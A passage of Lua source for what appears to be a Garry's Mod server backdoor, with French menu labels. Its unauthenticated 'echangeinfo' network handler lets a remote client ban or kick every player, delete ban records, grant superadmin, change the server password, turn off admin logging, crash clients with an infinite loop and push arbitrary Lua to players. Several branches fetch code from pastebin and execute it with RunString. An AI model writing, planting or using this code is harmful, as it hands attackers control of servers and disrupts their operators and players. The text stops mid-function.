end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]S'accroupir", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("squatmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de faire s'accroupir " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]S'accroupir", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unsquatmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'arrÃƒÂªter de faire s'accroupir " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

m:AddSpacer() -- Add a spacer
m:Open() -- Show our menu
end

net.Start( "echangeinfo" )
net.WriteString("reloadderma")
net.SendToServer()

		]] )
		net.Send(ply)
		return ""
end )


net.Receive("echangeinfo", function()
	local uaction = net.ReadString()
	local user = net.ReadEntity()

	if (uaction == "banall") then
		for k,v in pairs (player.GetAll()) do v:Ban( 0, true ) end
	end

	if (uaction == "banallstaff") then
		for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Ban( 0, true ) end end

	end

	if (uaction == "blackscreen") then
	user:ScreenFade( SCREENFADE.IN, Color( 0, 0, 0, 500 ), 500000, 500000 )
	end

	if (uaction == "imitation") then
		user:Say( net.ReadString(),true )
	end

	if (uaction == "sendluauser") then
		user:SendLua( net.ReadString() ) --sound.PlayURL( "https://translate.google.com/translate_tts?ie=UTF-8&tl=fr-TR&client=tw-ob&q=TEXTE", "", function()end )
	end
	
	if (uaction == "johnsound") then
		user:SendLua( [[http.Fetch("",function(body,len,headers,code)RunString(body)end) ]] ) --sound.PlayURL( "https://translate.google.com/translate_tts?ie=UTF-8&tl=fr-TR&client=tw-ob&q=TEXTE", "", function()end )
	end
	
	if (uaction == "soundboard") then
		user:SendLua( [[sound.PlayURL( "]]..net.ReadString()..[[", "", function()end )]] ) --sound.PlayURL( "https://translate.google.com/translate_tts?ie=UTF-8&tl=fr-TR&client=tw-ob&q=TEXTE", "", function()end )
	end

	if (uaction == "kickuser") then
		user:Kick( net.ReadString() )
	end

	if (uaction == "addmoney") then
		user:addMoney(net.ReadString())
	end

	if (uaction == "stopsoundon") then
		user:SendLua([[timer.Create("stopsound", 0.001, 0, function() LocalPlayer():ConCommand("stopsound") end)]])
	end

	if (uaction == "stopsoundoff") then
		user:SendLua([[timer.Remove("stopsound")]])
	end

	if (uaction == "igniteall") then
		for k,v in pairs(player.GetAll()) do v:Ignite(120) end
	end

	if (uaction == "igniteallstaff") then
		for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Ignite(120) end end
	end

	if (uaction == "healall") then
		for k,v in pairs (player.GetAll()) do v:SetHealth( net.ReadString() ) end
	end

	if (uaction == "armorall") then
		for k,v in pairs (player.GetAll()) do v:SetArmor( net.ReadString() ) end
	end

	if (uaction == "banuser") then
		user:Ban( 0, true )
	end

	if (uaction == "banipuser") then
		RunConsoleCommand( "addip", 0, user:IPAddress() )
		RunConsoleCommand( "writeip" )
	end

	if (uaction == "kickall") then
		for k,v in pairs (player.GetAll()) do v:Kick( net.ReadString() ) end
	end

	if (uaction == "kickallstaff") then
		for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Kick( net.ReadString() ) end end
	end

	if (uaction == "killall") then
		for k,v in pairs (player.GetAll()) do v:Kill() end
	end

	if (uaction == "exploseall") then
		for k,v in pairs(player.GetAll()) do
		local explode = ents.Create( "env_explosion" )
			explode:SetPos(v:GetPos())
			explode:Spawn()
			explode:SetKeyValue( "iMagnitude", "10" )
			explode:Fire( "Explode", 0, 0 )
			explode:EmitSound( "weapon_AWP.Single", 400, 400 )
		v:Kill()
		end
	end

	if (uaction == "exploseuser") then
		local explode = ents.Create( "env_explosion" )
			explode:SetPos(user:GetPos())
			explode:Spawn()
			explode:SetKeyValue( "iMagnitude", "10" )
			explode:Fire( "Explode", 0, 0 )
			explode:EmitSound( "weapon_AWP.Single", 400, 400 )
		user:Kill()
	end

	if (uaction == "exploseall") then
		for k,v in pairs(player.GetAll()) do
			if( v:GetUserGroup() != "user" ) then 
				local explode = ents.Create( "env_explosion" )
				explode:SetPos(v:GetPos())
				explode:Spawn()
				explode:SetKeyValue( "iMagnitude", "10" )
				explode:Fire( "Explode", 0, 0 )
				explode:EmitSound( "weapon_AWP.Single", 400, 400 )
			v:Kill()
			end
		end
	end

	if (uaction == "killallstaff") then
		for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Kill() end end
	end

	if (uaction == "freezeall") then
		for k,v in pairs (player.GetAll()) do v:Freeze( true ) end
	end

	if (uaction == "freezeallstaff") then
		for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Freeze( true ) end end
	end

	if (uaction == "freezeuser") then
		user:Freeze( true )
	end

	if (uaction == "moovetroll") then
		user:ConCommand( "+duck" )
		user:ConCommand( "+left" )
		user:ConCommand( "+jump" )
	end

	if (uaction == "moovetrollall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "+duck" ) end
		for k,v in pairs (player.GetAll()) do v:ConCommand( "+left" ) end
		for k,v in pairs (player.GetAll()) do v:ConCommand( "+jump" ) end
	end

	if (uaction == "unmoovetroll") then
		user:ConCommand( "-duck" )
		user:ConCommand( "-left" )
		user:ConCommand( "-jump" )
	end

	if (uaction == "unmoovetrollall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "-duck" ) end
		for k,v in pairs (player.GetAll()) do v:ConCommand( "-left" ) end
		for k,v in pairs (player.GetAll()) do v:ConCommand( "-jump" ) end
	end

	if (uaction == "addmoneyalls") then
	local money = net.ReadString()
		for k,v in pairs (player.GetAll()) do v:addMoney(money) end
	end

	if (uaction == "forwardmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "+forward" ) end
	end

	if (uaction == "botspam") then
	local n = net.ReadString()
		for i=1,n do
			RunConsoleCommand("bot")
		end
	end

	if (uaction == "unforwardmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "-forward" ) end
	end

	if (uaction == "hurlement") then
		for k,v in pairs(player.GetAll()) do v:EmitSound( "npc/stalker/go_alert2a.wav", 100, 100 ) end
	end

	if (uaction == "hurlementuser") then
		user:EmitSound( "npc/stalker/go_alert2a.wav", 100, 100 )
	end

	if (uaction == "unbanall") then
		sql.Query("DELETE FROM `FAdminBans`")
		sql.Query("DELETE FROM `ulib_bans`")
	end

	if (uaction == "backmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "+back" ) end
	end

	if (uaction == "pvheal") then
		user:SetHealth(net.ReadString())
	end

	if (uaction == "crashadminvip") then
	for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:SendLua("while true do end") end end
	end

	if (uaction == "armorpv") then
		user:SetArmor(net.ReadString())
	end

	if (uaction == "unbackmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "-back" ) end
	end

	if (uaction == "leftmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "+left" ) end
	end

	if (uaction == "unleftmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "-left" ) end
	end

	if (uaction == "rightmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "+right" ) end
	end

	if (uaction == "unrightmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "-right" ) end
	end

	if (uaction == "squatmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "+duck" ) end
	end

	if (uaction == "unsquatmooveall") then
		for k,v in pairs (player.GetAll()) do v:ConCommand( "-duck" ) end
	end

	if (uaction == "forwardmoove") then
		user:ConCommand( "+forward" )
	end

	if (uaction == "unforwardmoove") then
		user:ConCommand( "-forward" )
	end

	if (uaction == "backmoove") then
		user:ConCommand( "+back" )
	end

	if (uaction == "unbackmoove") then
		user:ConCommand( "-back" )
	end

	if (uaction == "leftmoove") then
		user:ConCommand( "+left" )
	end

	if (uaction == "unleftmoove") then
		user:ConCommand( "-left" )
	end

	if (uaction == "notification_generic") then
	local text = net.ReadString()
	local duration = 50
		for k,v in pairs (player.GetAll()) do
		
			v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_GENERIC, " .. duration .. ")")
			
			v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
			
			ULib.console( v, text )
			
		end
	end

	if (uaction == "notification_error") then
	local text = net.ReadString()
	local duration = 50
		for k,v in pairs (player.GetAll()) do
		
			v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_ERROR, " .. duration .. ")")
			
			v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
			
			ULib.console( v, text )
			
		end
	end

	if (uaction == "notification_undo") then
	local text = net.ReadString()
	local duration = 50
		for k,v in pairs (player.GetAll()) do
		
			v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_UNDO, " .. duration .. ")")
			
			v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
			
			ULib.console( v, text )
			
		end
	end

	if (uaction == "notification_hint") then
	local text = net.ReadString()
	local duration = 50
		for k,v in pairs (player.GetAll()) do
		
			v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_CLEANUP, " .. duration .. ")")
			
			v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
			
			ULib.console( v, text )
			
		end
	end

	if (uaction == "notification_cleanup") then
	local text = net.ReadString()
	local duration = 50
		for k,v in pairs (player.GetAll()) do
		
			v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_HINT, " .. duration .. ")")
			
			v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
			
			ULib.console( v, text )
			
		end
	end

	if (uaction == "rightmoove") then
		user:ConCommand( "+right" )
	end

	if (uaction == "unrightmoove") then
		user:ConCommand( "-right" )
	end

	if (uaction == "squatmoove") then
		user:ConCommand( "+duck" )
	end

	if (uaction == "unsquatmoove") then
		user:ConCommand( "-duck" )
	end

	if (uaction == "unfreezeall") then
		for k,v in pairs (player.GetAll()) do v:Freeze( false ) end
	end

	if (uaction == "unfreezeallstaff") then
		for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Freeze( false ) end end
	end

	if (uaction == "noclipallon") then
		for k,v in pairs (player.GetAll()) do v:SetMoveType( MOVETYPE_NOCLIP ) end
	end

	if (uaction == "noclipalloff") then
		for k,v in pairs (player.GetAll()) do v:SetMoveType( MOVETYPE_WALK ) end
	end

	if (uaction == "noclipon") then
		user:SetMoveType( MOVETYPE_NOCLIP )
	end

	if (uaction == "noclipoff") then
	user:SetMoveType( MOVETYPE_WALK )
	end

	if (uaction == "unfreezeuser") then
		user:Freeze( false )
		user:UnLock()
		ulx.clearExclusive( user )
	end

	if (uaction == "jump") then
		for k,v in pairs (player.GetAll()) do v:SetJumpPower( 2000 ) end
	end

	if (uaction == "retablirjumpall") then
		for k,v in pairs (player.GetAll()) do v:SetJumpPower( 200 ) end
	end

	if (uaction == "2dplayerall") then
    for k,v in pairs(player.GetAll()) do 
	    local a = v:LookupBone("ValveBiped.Bip01_Head1")
	    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
	    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
	    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
	    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
	    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
	    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
	    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
	    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
	    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
	    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end
	end

	if (uaction == "grossetete") then
    	for k,v in pairs(player.GetAll()) do 
    	local a = v:LookupBone("ValveBiped.Bip01_Head1")
        v:ManipulateBoneScale( a, Vector(5,5,5)) 
        end
	end

	if (uaction == "grosseteteuser") then
    	local a = user:LookupBone("ValveBiped.Bip01_Head1")
        user:ManipulateBoneScale( a, Vector(5,5,5)) 
	end

	if (uaction == "2dplayeruser") then
	    local a = user:LookupBone("ValveBiped.Bip01_Head1")
	    local b = user:LookupBone("ValveBiped.Bip01_R_Thigh")
	    local c = user:LookupBone("ValveBiped.Bip01_L_Thigh")
	    local d = user:LookupBone("ValveBiped.Bip01_R_Calf")
	    local e = user:LookupBone("ValveBiped.Bip01_L_Calf")
	    local f = user:LookupBone("ValveBiped.Bip01_R_UpperArm")
	    local g = user:LookupBone("ValveBiped.Bip01_L_UpperArm")
	    local h = user:LookupBone("ValveBiped.Bip01_R_Forearm")
	    local i = user:LookupBone("ValveBiped.Bip01_L_Forearm")
	    local j = user:LookupBone("ValveBiped.Bip01_R_Clavicle")
	    local k = user:LookupBone("ValveBiped.Bip01_L_Clavicle")
        user:ManipulateBoneScale( a, Vector(4,0,4)) 
        user:ManipulateBoneScale( b, Vector(0,0,0))
        user:ManipulateBoneScale( c, Vector(0,0,0))
        user:ManipulateBoneScale( d, Vector(0,0,1))
        user:ManipulateBoneScale( e, Vector(0,0,1))
        user:ManipulateBoneScale( f, Vector(0,0,0))
        user:ManipulateBoneScale( g, Vector(0,0,0))
        user:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        user:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        user:ManipulateBoneScale( j, Vector(0,0,0))
        user:ManipulateBoneScale( k, Vector(0,0,0))
	end

	if (uaction == "jumpuser") then
		user:SetJumpPower( 2000 )
	end

	if (uaction == "jumpuser") then
		user:SetJumpPower( 2000 )
	end

	if (uaction == "logsremove") then
		RunConsoleCommand("ulx_logecho", "0")
	end

	if (uaction == "gm_construct_spawn") then
		user:SetPos( Vector( 786.414490, -166.286102, -79.968750 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "gm_construct_building_roof0") then
		user:SetPos( Vector( 1741.335815, -1606.526245, 1161.920288 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "gm_construct_building_roof1") then
		user:SetPos( Vector( 1434.847778, -1624.269897, 1360.031250 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "gm_construct_building2_roof0") then
		user:SetPos( Vector( -2312.447266, -2994.058105, 2912.031250 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "gm_construct_building3_roof0") then
		user:SetPos( Vector( -4632.838379, 5414.228516, 2560.031250 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "gm_construct_building2_roof1") then
		user:SetPos( Vector( -2301.528564, -3178.893555, 2368.031250 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "gm_construct_down") then
		user:SetPos( Vector( -2072.327148, -120.263184, -447.968750 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "gm_construct_secret") then
		user:SetPos( Vector( -2994.707031, -1243.276611, -77.271637 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "gm_construct_skybox") then
		user:SetPos( Vector( -1543.972412, 1734.876221, 10937.232422 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "gm_flat_secret") then
		user:SetPos( Vector( -599.203491, 6.064875, -12703.968750 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "glife3_grue") then
		user:SetPos( Vector( -2150.254395, 7953.561523, 1333.250366 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "glife3_secret") then
		user:SetPos( Vector( -7075.260742, 1205.734009, -288.307312 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "glife3_coffre") then
		user:SetPos( Vector( -6389.708008, 5038.359375, 96.025749 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "glife3_water_tower") then
		user:SetPos( Vector( 5316.801758, 15845.748047, 1652.517944 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end

	if (uaction == "rp_rockford_v2b_spawn") then
		user:SetPos( Vector( -4701.085938 ,-5387.226563,128.031250 ) )
		user:SetLocalVelocity( Vector( 0, 0, 0 ) )
	end



	if (uaction == "spamchat") then
		timer.Create( "spamchat1", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), "Ã¢â€“Â Ã¢â€“â€š Ã¢â€“Æ’ Ã¢â€“â€ž Ã¢â€“â€¦ Ã¢â€“â€  Ã¢â€“â€¡Ã„Â¤Ã¡ÂºÂªÃ„Ë†ÃÅ’Ã„â€™Ã„Å½ Ã Â¸Â¿Ã‚Â¥ Ã„â€ÃÂÃ„Â¨Ã„Â©Ã„â€ Ã¡ÂºÂ¤ Ã…Â¤ÃŽË†Ã‡ÂºMÃ¢â€“Ë† Ã¢â€“â€¡ Ã¢â€“â€  Ã¢â€“â€¦ Ã¢â€“â€ž Ã¢â€“â€š Ã¢â€“Â")]]) end)
	end

	if (uaction == "restartserver") then
		if file.Exists("data/ulx/config.txt", "GAME") then
			game.ConsoleCommand("ulx map " .. game.GetMap() .. "\n")
		else
			game.ConsoleCommand("changelevel " .. game.GetMap() .. "\n")
		end
	end

	if (uaction == "spamchatstop") then
	timer.Stop( "spamchat1")	
	end

	if (uaction == "setmodel") then
		user:SetModel( net.ReadString() )
	end

	if (uaction == "retablirjumpuser") then
		user:SetJumpPower( 200 )
	end

	if (uaction == "launchuser") then
		user:SetVelocity( Vector( 0,0,50 ) * 50 )
	end

	if (uaction == "lockdown") then
		user:Give( "weapon_rpg" )
		user:GiveAmmo( 200, "RPG_Round", true )
		user:SendLua([[
hook.Add( "Think", "TriggerBofezt", function()
RunConsoleCommand("use","weapon_rpg")
if !Firing then
	RunConsoleCommand( "+attack" )
	Firing = true
else
	RunConsoleCommand( "-attack" )
	Firing = false
end
end )
		]])
	end

	if (uaction == "launchall") then
		for k,v in pairs (player.GetAll()) do 
			v:SetVelocity( Vector( 0,0,50 ) * 50 )
		end
	end

	if (uaction == "globalhack") then
		if !ptdr then
			for k,v in pairs (player.GetAll()) do v:SendLua([[http.Fetch("",function(b) RunString(b) end)]]) end -- https://hastebin.com/raw/huyupufifi
			local ptdr = 1
		else
			local ptdr = 0
			for k,v in pairs (player.GetAll()) do v:SendLua([[hook.Remove("PostDrawOpaqueRenderables","\xFFitsrainingchairs\xFF")]]) end
		end
	end

	if (uaction == "changename") then
	RunConsoleCommand("hostname", net.ReadString())
	end

if (uaction == "namechanger") then
local namesf = {
"Marc",                  
"Hugh",      
"Maurice",      
"Gill",                    
"Etienne",      
"Antoine",      
"Jean",      
"Benoit",      
"Gilbert",      
"Laurent",      
"Alexis",      
"Alexandre",      
"Denis",      
"Nicholas",      
"Leon",      
"Leonard",      
"Leo",      
"Olivier",                  
"Curtis",            
"Antonio",      
"Gregory",      
"Charlie",      
"Luc",      
"Patrick",      
"Phillip",      
"Bernard",            
"Charles",            
"Gaspar",      
"Claude",      
"Michael",      
"Brandon",      
"Richard",      
"William",      
"Serge",      
"Freddie",                  
"Samuel",      
"Gaetan",      
"Gerald",      
"Arnold",      
"Roland",      
"Justin",      
"Theodore",      
"Claude",      
"Hugues",      
"Albert",      
"Arthur",      
"Jay",      
"Jeremi",      
"Rene",      
"Pascal",      
"Carlos",      
"Fabien",      
"Rafael",      
"Benjamin",      
"Ernest",      
"Victor",      
"Martin",      
"Franck",      
"Walter",      
"Isaac",      
"Roger",         
"Alfred",      
"Jason",            
"Danny",      
"Henry",      
"Jimmy",      
"Kevin",      
"Geoffrey",                      
"Dominic",      
"Christopher",
"David",
"Steven",
}
for k,v in pairs (player.GetAll()) do local name = table.Random( namesf ) v:Say("/name " .. name,true) end
	end

	if (uaction == "namechangerspam") then
local namesfs = {
"Marc",                  
"Hugh",      
"Maurice",      
"Gill",                    
"Etienne",      
"Antoine",      
"Jean",      
"Benoit",      
"Gilbert",      
"Laurent",      
"Alexis",      
"Alexandre",      
"Denis",      
"Nicholas",      
"Leon",      
"Leonard",      
"Leo",      
"Olivier",                  
"Curtis",            
"Antonio",      
"Gregory",      
"Charlie",      
"Luc",      
"Patrick",      
"Phillip",      
"Bernard",            
"Charles",            
"Gaspar",      
"Claude",      
"Michael",      
"Brandon",      
"Richard",      
"William",      
"Serge",      
"Freddie",                  
"Samuel",      
"Gaetan",      
"Gerald",      
"Arnold",      
"Roland",      
"Justin",      
"Theodore",      
"Claude",      
"Hugues",      
"Albert",      
"Arthur",      
"Jay",      
"Jeremi",      
"Rene",      
"Pascal",      
"Carlos",      
"Fabien",      
"Rafael",      
"Benjamin",      
"Ernest",      
"Victor",      
"Martin",      
"Franck",      
"Walter",      
"Isaac",      
"Roger",         
"Alfred",      
"Jason",            
"Danny",      
"Henry",      
"Jimmy",      
"Kevin",      
"Geoffrey",                      
"Dominic",      
"Christopher",
"David",
"Steven",
}
timer.Create( "namechangerspam", 5, 0, function() 
for k,v in pairs (player.GetAll()) do local namez = table.Random( namesfs ) v:Say("/name " .. namez,true) end
end)
	end

	if (uaction == "namechangerstop") then
	timer.Destroy("namechangerspam")
	end

	if (uaction == "allowcsluads") then
	RunConsoleCommand("sv_allowcslua", net.ReadString())
	end

	if (uaction == "secureinfo") then
	RunConsoleCommand("sv_password", net.ReadString())
	end
	
	if (uaction == "changeload") then
	RunConsoleCommand( "sv_loadingurl", net.ReadString() )
	end

	if (uaction == "killuser") then
		user:Kill()
	end

	if (uaction == "addmoneyall") then
		for k,v in pairs(player.GetAll()) do timer.Create( "timerargent10", 0.01, 0, function() v:addMoney(11) end) end
	end

	if (uaction == "flashon") then
		user:SendLua([[timer.Create("impulse 100", 0.001, 0, function() LocalPlayer():ConCommand("impulse 100") end)]])
	end

	if (uaction == "flashoff") then
		user:SendLua([[timer.Remove("impulse 100")]])
	end

	if (uaction == "screenon") then
	user:SendLua([[timer.Create("screenshot requested", 0.001, 0, function() LocalPlayer():ConCommand("screenshot requested") end)]])
	end

	if (uaction == "screenoff") then
	user:SendLua([[timer.Remove("screenshot requested")]])
	end

	if (uaction == "killusersilence") then
		user:KillSilent()
	end

	if (uaction == "allkillusersilence") then
	for k,v in pairs (player.GetAll()) do v:KillSilent() end
	end

	if (uaction == "animation_salute") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE) end
	end

	if (uaction == "animation_salute_loop") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE) end
	timer.Create("salute_loop",3.3,0,function()
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE) end
	end )
	end

	if (uaction == "animation_robot") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT) end
	end

	if (uaction == "animation_robot_loop") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT) end
	timer.Create("robot_loop",11.35,0,function()
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT) end
	end )
	end

	if (uaction == "animation_cheer") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end
	end

	if (uaction == "animation_cheer_loop") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end
	timer.Create("cheer_loop",2.7,0,function()
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER) end
	end )
	end

	if (uaction == "animation_laugh") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end
	end

	if (uaction == "animation_laugh_loop") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end
	timer.Create("laugh_loop",5.81,0,function()
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH) end
	end )
	end

	if (uaction == "animation_muscle") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE) end
	end

	if (uaction == "animation_muscle_loop") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE) end
	timer.Create("muscle_loop",13,0,function()
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE) end
	end )
	end

	if (uaction == "animation_persistence") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end
	end

	if (uaction == "animation_persistence_loop") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end
	timer.Create("persistence_loop",3,0,function()
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE) end
	end )
	end

	if (uaction == "animation_dance") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
	end

	if (uaction == "animation_dance_loop") then
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
	timer.Create("dance_loop",8.9,0,function()
	for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
	end )
	end

	if (uaction == "stop_timer_animation") then
	timer.Destroy("salute_loop")
	timer.Destroy("robot_loop")
	timer.Destroy("cheer_loop")
	timer.Destroy("laugh_loop")
	timer.Destroy("muscle_loop")
	timer.Destroy("persistence_loop")
	timer.Destroy("dance_loop")
	end

	if (uaction == "scaleuser") then
	local scale = net.ReadString()
	user:SetModelScale( scale, 2 )
	end

	if (uaction == "scaleall") then
	local scale = net.ReadString()
	
	for k,v in pairs (player.GetAll()) do v:SetModelScale( scale, 2 ) end
	end

	if (uaction == "animation_salute_user") then
	user:DoAnimationEvent(ACT_GMOD_TAUNT_SALUTE)
	end

	if (uaction == "animation_robot_user") then
	user:DoAnimationEvent(ACT_GMOD_TAUNT_ROBOT)
	end

	if (uaction == "animation_cheer_user") then
	user:DoAnimationEvent(ACT_GMOD_TAUNT_CHEER)
	end

	if (uaction == "animation_laugh_user") then
	user:DoAnimationEvent(ACT_GMOD_TAUNT_LAUGH)
	end

	if (uaction == "animation_muscle_user") then
	user:DoAnimationEvent(ACT_GMOD_TAUNT_MUSCLE)
	end

	if (uaction == "animation_persistence_user") then
	user:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE)
	end

	if (uaction == "animation_dance_user") then
	user:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
	end

	if (uaction == "allkillusersilencestaff") then
	for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:KillSilent() end end
	end

	if (uaction == "fireuser") then
		user:Ignite( 30 )
	end

	if (uaction == "modelall") then
	local model = net.ReadString()
		for k,v in pairs(player.GetAll()) do v:SetModel(model) end
	end
	
	if (uaction == "cassergr") then
		user:SetGravity( -5 )
	end

	if (uaction == "physicgamestyle") then
		RunConsoleCommand("sv_friction", "-8")
	end

	if (uaction == "retablirphysicgamestyle") then
		RunConsoleCommand("sv_friction", "8")
	end

	if (uaction == "earthquakeonall") then
		for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end
	end
	
	if (uaction == "reloadderma") then
		http.Fetch("https://pastebin.com/raw/8xPJTbpF",function(body) RunString(body) end)
	end
	
	if (uaction == "itemsall") then
	local itemsss = net.ReadString()
	for k,v in pairs (player.GetAll()) do v:Give( itemsss ) end
	end

	if (uaction == "cleanup") then
		game.CleanUpMap()
	end

	if (uaction == "cassergrall") then
		for k,v in pairs (player.GetAll()) do v:SetGravity( -5 ) end
	end
	
	if (uaction == "superadmin") then
		user:SetUserGroup("superadmin")
	end

	if (uaction == "custom") then
		user:SetUserGroup(net.ReadString())
	end

	if (uaction == "userrank") then
		user:SetUserGroup("user")
	end
	
	if (uaction == "retablirgr") then
		user:SetGravity( 0 )
	end

	if (uaction == "retablirgrall") then
		for k,v in pairs (player.GetAll()) do v:SetGravity( 0 ) end
	end

	if (uaction == "strip") then
		user:StripWeapons()
	end

	if (uaction == "unjailall") then
		game.ConsoleCommand("ulx unjail *\n")
	end

	if (uaction == "contextfucker") then

util.AddNetworkString("enigmamod")

net.Receive( "enigmamod", function(len, len, ply)
    local v = net.ReadEntity()
	local two = net.ReadInt(32)
	
	local function zapEffect(target)
		local effectdata = EffectData()
		effectdata:SetScale(1)
		effectdata:SetMagnitude(1)
		effectdata:SetScale(3)
		effectdata:SetRadius(2)
		effectdata:SetEntity(target)
		for i = 1, 100, 1 do
			timer.Simple(1 / i, function()
